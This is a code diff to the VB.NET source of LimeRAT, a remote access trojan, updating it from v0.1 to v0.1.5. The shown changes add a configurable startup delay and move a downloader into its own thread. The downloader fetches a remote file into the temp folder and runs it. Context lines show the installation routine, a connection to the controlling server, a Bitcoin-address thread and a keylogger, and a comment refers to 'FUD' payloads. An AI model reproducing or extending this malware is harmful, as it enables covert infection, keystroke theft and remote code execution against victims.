@@ -18,7 +18,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                      .. LimeRAT v0.1 ..                      ##
+'##                    .. LimeRAT v0.1.5 ..                      ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -43,8 +43,11 @@ Namespace Lime
             'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
             'Thread.Sleep(35000) '[New client infected]
             'End If
-
-            Threading.Thread.Sleep(1000)
+            Dim num As Integer = C_Settings.Delay
+            Do Until num = 0
+                Threading.Thread.Sleep(1000)
+                num -= 1
+            Loop
 
             Dim createdNew As Boolean 'Making sure that only 1 process is running
             C_Settings.NMT = New Threading.Mutex(True, C_Settings.MTX, createdNew)
@@ -62,7 +65,7 @@ Namespace Lime
 
             Call C_Installation.INS()
 
-            C_Socket.T1.Start() 'Start TCP connection to server
+            C_Socket.T1.Start()
 
             If C_Settings.BTC_ADDR.Length > 25 Then
                 Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf _BTC_ST)
@@ -86,28 +89,8 @@ Namespace Lime
             Dim KL As New C_Keylog
             KL.Start()
 
-            Try
-                If C_Settings.DWN_LINK <> "" Then
-
-                    If C_Settings.DWN_CHK = True Then
-                        If GTV("DWN") <> "True" Then
-                            Dim WC As New Net.WebClient
-                            Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
-                            WC.DownloadFile(C_Settings.DWN_LINK, file)
-                            Diagnostics.Process.Start(file)
-                            STV("DWN", "True")
-                        End If
-
-                    Else
-                        Dim WC As New Net.WebClient
-                        Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
-                        WC.DownloadFile(C_Settings.DWN_LINK, file)
-                        Diagnostics.Process.Start(file)
-                    End If
-                End If
-            Catch ex As Exception
-                C.Send("MSG" + SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
-            End Try
+            Dim DW As Threading.Thread = New Threading.Thread(AddressOf Downloader)
+            DW.Start()
 
         End Sub
 
@@ -204,6 +187,34 @@ Namespace Lime
         End Sub
 
 #End Region
+
+#Region "Downloader"
+        Private Shared Sub Downloader()
+            Try
+                If C_Settings.DWN_LINK <> "" Then
+
+                    If C_Settings.DWN_CHK = True Then
+                        If GTV("DWN") <> "True" Then
+                            Dim WC As New Net.WebClient
+                            Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
+                            WC.DownloadFile(C_Settings.DWN_LINK, file)
+                            Diagnostics.Process.Start(file)
+                            STV("DWN", "True")
+                        End If
+
+                    Else
+                        Dim WC As New Net.WebClient
+                        Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
+                        WC.DownloadFile(C_Settings.DWN_LINK, file)
+                        Diagnostics.Process.Start(file)
+                    End If
+                End If
+            Catch ex As Exception
+                C.Send("MSG" + SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
+            End Try
+        End Sub
+#End Region
+
 
     End Class
 
